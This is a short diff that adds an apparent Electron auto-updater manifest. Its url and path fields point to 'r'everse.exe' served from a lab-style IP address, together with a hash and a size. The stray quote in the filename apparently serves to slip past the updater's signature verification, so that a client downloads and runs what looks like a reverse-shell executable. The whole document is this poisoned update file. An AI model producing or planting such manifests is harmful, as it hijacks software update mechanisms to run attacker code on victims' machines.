@@ -1,0 +1,8 @@
+version: 2.0.0
+files:
+  - url: http://10.10.14.76:8000/r'everse.exe
+    sha512: BOTnwz07k3iKZakwqVMFfwClG0N+R1ho0v1D/HmYQZX7ODe7YI0Z7fZe4PB87IkYrBH1CQQ8xPlgBcWj9A8F6g==
+    size: 7168
+path: r'everse.exe
+sha512: BOTnwz07k3iKZakwqVMFfwClG0N+R1ho0v1D/HmYQZX7ODe7YI0Z7fZe4PB87IkYrBH1CQQ8xPlgBcWj9A8F6g==
+releaseDate: '2021-04-21T21:17:05.353Z'
